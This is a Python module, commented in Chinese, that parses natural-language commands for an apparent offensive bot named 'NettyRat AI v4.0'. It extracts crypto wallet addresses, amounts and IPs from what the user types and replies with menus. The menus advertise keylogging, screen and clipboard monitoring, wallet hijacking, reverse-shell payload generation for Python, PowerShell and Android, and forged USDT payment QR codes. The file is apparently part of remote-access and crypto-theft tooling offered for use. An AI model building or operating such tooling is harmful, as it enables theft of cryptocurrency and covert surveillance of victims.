#!/usr/bin/env python3
"""自然语言处理 - 理解用户意图"""
import re
from typing import Dict, List, Optional

class NLPProcessor:
    """自然语言处理"""

    def __init__(self):
        self.intents = {
            'attack': ['攻击', 'hack', 'exploit', '入侵', '打', '搞', 'attack', 'exploit'],
            'recon': ['侦察', '扫描', '信息', '查看', 'scan', 'recon', 'reconnaissance'],
            'monitor': ['监控', '监听', 'watch', 'monitor', '看', 'observe'],
            'generate': ['生成', '创建', 'make', 'generate', 'create', 'build'],
            'status': ['状态', '情况', 'status', 'info', '怎么样', 'how'],
            'help': ['帮助', '怎么用', 'help', '?', '菜单', 'menu'],
            'energy': ['能量', 'energy', 'power', '充能', 'recharge'],
            'stop': ['停止', 'stop', ' halt', '结束', 'end'],
        }

        self.entities = {
            'target_types': ['钱包', '支付', '网站', '服务器', 'api', '二维码', '授权', 'wallet', 'payment', 'server'],
            'chains': ['tron', 'eth', 'bsc', 'btc', 'ethereum', 'binance'],
            'actions': ['伪造', '篡改', '劫持', '替换', '扫描', '监听', '截图', 'forge', 'tamper', 'hijack'],
        }

    def parse(self, text: str) -> Dict:
        """解析用户输入"""
        text_lower = text.lower()

        intent = self._detect_intent(text_lower)
        entities = self._extract_entities(text_lower)
        params = self._extract_params(text)

        return {
            'intent': intent,
            'entities': entities,
            'params': params,
            'confidence': self._calculate_confidence(intent, entities),
            'raw': text,
        }

    def _detect_intent(self, text: str) -> str:
        scores = {}
        for intent, keywords in self.intents.items():
            score = sum(1 for kw in keywords if kw.lower() in text)
            scores[intent] = score

        if not any(scores.values()):
            return 'unknown'
        return max(scores, key=scores.get)

    def _extract_entities(self, text: str) -> Dict:
        found = {}

        for category, items in self.entities.items():
            matches = [item for item in items if item.lower() in text]
            if matches:
                found[category] = matches

        # 提取地址
        address_patterns = [
            (r'T[1-9A-HJ-NP-Za-km-z]{33}', 'tron_address'),
            (r'0x[a-fA-F0-9]{40}', 'eth_address'),
        ]
        for pattern, name in address_patterns:
            matches = re.findall(pattern, text)
            if matches:
                found[name] = matches

        # 提取金额
        amount_match = re.search(r'(\d+\.?\d*)\s*(usdt|trx|eth|btc)?', text, re.I)
        if amount_match:
            found['amount'] = float(amount_match.group(1))
            found['currency'] = (amount_match.group(2) or 'usdt').upper()

        return found

    def _extract_params(self, text: str) -> Dict:
        params = {}

        url_match = re.search(r'https?://[^\s]+', text)
        if url_match:
            params['url'] = url_match.group()

        ip_match = re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', text)
        if ip_match:
            params['ip'] = ip_match.group()

        num_matches = re.findall(r'-?\d+\.?\d*', text)
        if num_matches:
            params['numbers'] = [float(n) for n in num_matches]

        return params

    def _calculate_confidence(self, intent: str, entities: Dict) -> float:
        base = 0.5
        if intent != 'unknown':
            base += 0.3
        if entities:
            base += min(0.2, len(entities) * 0.05)
        return min(1.0, base)

    def generate_response(self, parse_result: Dict, brain_status: str, energy_status: str) -> str:
        intent = parse_result['intent']
        entities = parse_result['entities']

        responses = {
            'attack': self._attack_response,
            'recon': self._recon_response,
            'monitor': self._monitor_response,
            'generate': self._generate_response,
            'status': self._status_response,
            'energy': self._energy_response,
            'help': self._help_response,
        }

        handler = responses.get(intent, self._unknown_response)
        return handler(parse_result, brain_status, energy_status)

    def _attack_response(self, result, brain, energy):
        targets = result['entities'].get('target_types', ['目标'])
        return f"""
🎯 **AI 理解你的攻击意图**
━━━━━━━━━━━━━━━━━━━━━
检测到目标类型: `{', '.join(targets)}`
置信度: `{result['confidence']*100:.1f}%`

{brain}

正在分析最优攻击路径...
使用 `/ai_plan` 查看详细计划
"""

    def _recon_response(self, result, brain, energy):
        return f"""
🔍 **AI 侦察模式**
━━━━━━━━━━━━━━━━━━━━━
{brain}
{energy}

发送目标信息开始侦察:
格式: `/recon <url/ip>`
"""

    def _monitor_response(self, result, brain, energy):
        return f"""
👁️ **AI 监控中心**
━━━━━━━━━━━━━━━━━━━━━
{energy}

可用监控:
• `/monitor screen` - 屏幕监控
• `/monitor clipboard` - 剪切板
• `/monitor wallet` - 钱包劫持
• `/monitor keylog` - 键盘记录
• `/monitor approval` - 授权监控
"""

    def _generate_response(self, result, brain, energy):
        return f"""
🔧 **AI Payload 生成器**
━━━━━━━━━━━━━━━━━━━━━
{energy}

可用生成:
• `/payload python <host> <port>`
• `/payload powershell <host> <port>`
• `/payload android <host> <port>`
• `/qr <amount> <address>` - 伪造QR
"""

    def _status_response(self, result, brain, energy):
        return f"""
📊 **系统状态总览**
━━━━━━━━━━━━━━━━━━━━━
{brain}
{energy}
"""

    def _energy_response(self, result, brain, energy):
        return f"""
⚡ **能量管理中心**
━━━━━━━━━━━━━━━━━━━━━
{energy}

操作:
• `/recharge` - 充值能量
• `/energy` - 查看状态
"""

    def _help_response(self, result, brain, energy):
        return """
🤖 **NettyRat AI v4.0 帮助**
━━━━━━━━━━━━━━━━━━━━━
你可以用自然语言与我交互:

🗣️ **示例指令:**
• "攻击这个钱包 Txxx..." 
• "生成一个反向shell"
• "监控屏幕和剪切板"
• "扫描 192.168.1.1"
• "伪造一个USDT支付码 100"
• "查看状态"
• "我的能量还有多少"

🎯 **快捷命令:**
/start - 主菜单
/ai - AI 交互模式
/status - 系统状态
/energy - 能量状态
/recharge - 能量充值
/analyze - AI分析目标
/plan - 生成攻击计划
"""

    def _unknown_response(self, result, brain, energy):
        return f"""
🤔 **AI 未能完全理解**
━━━━━━━━━━━━━━━━━━━━━
输入: `{result['raw']}`
检测意图: `{result['intent']}`
置信度: `{result['confidence']*100:.1f}%`

尝试使用更明确的指令，或发送 /help 查看帮助
"""
